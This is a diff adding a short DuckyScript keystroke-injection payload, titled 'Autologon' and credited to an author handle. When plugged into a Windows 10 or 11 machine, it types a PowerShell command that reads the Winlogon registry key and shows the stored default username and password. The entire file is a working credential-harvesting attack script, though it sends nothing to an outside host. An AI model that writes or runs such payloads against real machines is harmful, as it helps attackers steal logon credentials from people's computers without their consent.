@@ -1,0 +1,10 @@
+REM     Title: Autologon
+
+REM     Author: cbk914
+
+REM     Description: Search for autologon credentials
+
+REM     Target: Windows 10, 11
+DELAY 1000
+STRING powershell -c "gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
+ENTER
